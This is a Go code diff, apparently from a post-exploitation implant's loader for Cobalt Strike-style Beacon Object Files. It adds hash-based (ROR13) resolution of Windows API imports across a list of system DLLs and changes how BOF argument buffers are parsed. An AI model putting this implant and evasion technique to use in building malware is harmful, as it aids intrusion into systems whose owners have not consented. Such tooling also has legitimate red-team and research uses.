@@ -59,7 +59,31 @@ func resolveBeaconImport(name string) (uintptr, bool) {
 			return addr, true
 		}
 	}
+	// Fallback for the mingw-w64 plain `__imp_<Func>` form (no DLL
+	// prefix). Walk a curated list of common libraries the function
+	// might live in, returning the first hit. Order: kernel32 →
+	// advapi32 → user32 → ws2_32 → ole32 → shell32. This covers the
+	// majority of CS BOFs in the public corpus.
+	bare := strings.TrimPrefix(name, "__imp_")
+	for _, dll := range bareImportSearchOrder {
+		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(bare)); err == nil && addr != 0 {
+			return addr, true
+		}
+	}
 	return 0, false
+}
+
+// bareImportSearchOrder lists the modules the bare-form __imp_<func>
+// resolver consults. Order matters — first hit wins. kernel32 first
+// (catches LoadLibrary/GetProcAddress/CreateFile/...), then the other
+// frequent suspects.
+var bareImportSearchOrder = []string{
+	"KERNEL32.DLL",
+	"ADVAPI32.dll",
+	"USER32.dll",
+	"WS2_32.dll",
+	"OLE32.dll",
+	"SHELL32.dll",
 }
 
 // parseDollarImport splits a CS-format dynamic-link import symbol name into
@@ -176,20 +200,21 @@ func beaconDataParseImpl(parserPtr, bufPtr, sz uintptr) uintptr {
 		return 0
 	}
 	p := (*dataParser)(unsafe.Pointer(parserPtr))
-	// CS BOFs expect the first 4 bytes of the buffer to be the total
-	// length (uint32), followed by length bytes of payload — the
-	// BeaconDataPack convention.
-	if int(sz) < 4 || bufPtr == 0 {
+	if bufPtr == 0 || sz == 0 {
 		p.original = bufPtr
 		p.buffer = bufPtr
 		p.length = 0
 		p.size = 0
 		return 0
 	}
-	header := unsafe.Slice((*byte)(unsafe.Pointer(bufPtr)), 4)
-	total := int32(binary.LittleEndian.Uint32(header))
+	// The buffer is consumed verbatim — no separate length-prefix header.
+	// `size` is the authoritative payload length, matching the format
+	// produced by Args.Pack (length-prefixed values back-to-back, no
+	// envelope). CS-format BOFs receive the same shape from the
+	// implant's go(char*, int) entry signature.
+	total := int32(sz)
 	p.original = bufPtr
-	p.buffer = bufPtr + 4
+	p.buffer = bufPtr
 	p.length = total
 	p.size = total
 	return 0
